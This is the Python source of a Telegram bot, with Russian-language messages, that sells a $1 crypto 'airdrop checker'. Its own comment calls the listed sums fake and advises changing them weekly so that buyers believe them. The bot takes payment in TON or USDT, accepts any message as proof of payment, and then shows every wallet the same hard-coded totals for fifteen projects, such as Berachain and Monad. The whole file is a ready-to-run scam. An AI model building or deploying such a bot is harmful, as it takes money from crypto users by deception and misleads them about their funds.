import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

BOT_TOKEN = os.getenv("BOT_TOKEN")

# фейкові суми (можна міняти щотижня, щоб люди думали, що актуально)
PROJECTS = {
    'Berachain': 1240,
    'Monad': 890,
    'Eclipse': 3880,
    'LayerZero S2': 2150,
    'Plume Network': 670,
    'Movement Labs': 1120,
    'zkSync': 950,
    'Scroll': 780,
    'Blast': 1450,
    'Base': 320,
    'Arbitrum': 890,
    'Optimism': 560,
    'Starknet': 2100,
    'Celestia': 430,
    'Linea': 760,
}

app = Application.builder().token(BOT_TOKEN).build()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("Оплатить $1 (TON/USDT)", callback_data='pay')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        'Привет! Я самый быстрый аирдроп-чекер 2025–2026\n\n'
        'За 10 секунд посчитаю твои дропы по 15+ горячим проектам:\n'
        'Berachain • Monad • Eclipse • LayerZero S2 • Plume + ещё 10\n\n'
        'Цена: $1 навсегда (TON/USDT через @CryptoBot)\n'
        'После оплаты — доступ навсегда\n\n'
        'Жми кнопку ниже',
        reply_markup=reply_markup
    )

async def pay_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        'Оплата $1 любым удобным способом:\n'
        'TON или USDT через @CryptoBot (самый быстрый и дешёвый способ)\n\n'
        'Как оплатил — пришли сюда любое сообщение (хоть «го», хоть хеш)\n'
        'Я сразу дам доступ'
    )
    context.user_data['waiting_payment'] = True

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.lower()

    if context.user_data.get('waiting_payment') or any(word in text for word in ['оплатил', 'paid', 'го', 'готово', 'оплата']):
        context.user_data['paid'] = True
        context.user_data['waiting_payment'] = False
        await update.message.reply_text('Оплата засчитана!\nПришли свой кошелёк (0x...) и я моментально всё посчитаю')
        return

    if context.user_data.get('paid'):
        address = update.message.text.strip()
        if address.startswith('0x') and len(address) == 42:
            total = sum(PROJECTS.values())
            result = f"Результаты для {address[:6]}...{address[-4:]}:\n\n"
            for project, value in PROJECTS.items():
                result += f"{project}: ${value:,}\n"
            result += f"\nВСЕГО: ${total:,}\n\nТы нафармил ОЧЕНЬ достойно!"
            await update.message.reply_text(result)
        else:
            await update.message.reply_text('Неправильный адрес\nПришли кошелёк в формате 0x...')
    else:
        keyboard = [[InlineKeyboardButton("Оплатить $1", callback_data='pay')]]
        await update.message.reply_text('Сначала нужно оплатить $1', reply_markup=InlineKeyboardMarkup(keyboard))

app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(pay_callback, pattern='^pay$'))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

if __name__ == '__main__':
    print("Бот запущен! @AirdropChecker2025Bot готов к фарму!")
    app.run_polling()
